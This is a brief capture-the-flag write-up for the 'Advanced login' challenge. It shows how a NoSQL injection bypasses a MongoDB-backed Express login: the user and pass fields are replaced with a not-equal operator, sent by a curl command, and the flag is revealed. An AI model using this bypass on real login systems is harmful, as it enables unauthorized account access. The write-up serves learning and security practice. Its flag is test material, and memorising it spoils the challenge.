# Writeup Advanced login

If you inspect the headers the http server returns you can see that the web app uses the javascript framework Express.
In the script.js file we can see that the form on the website posts the content as json. Lets assume the server uses mongodb.
We can then replace the user and pass with `{"$ne": ""}`
That makes the query return every user with username and password not equal to the empty string.

```bash
curl -H "Content-Type: application/json" \
     -X POST \
     -d '{"user": {"$ne": ""}, "pass": {"$ne": ""}}' \
     https://advanced-login.tghack.no/login
```

Then you get the token:
```
TG18{NoSQL_doesn't_mean_not_injectable}
```
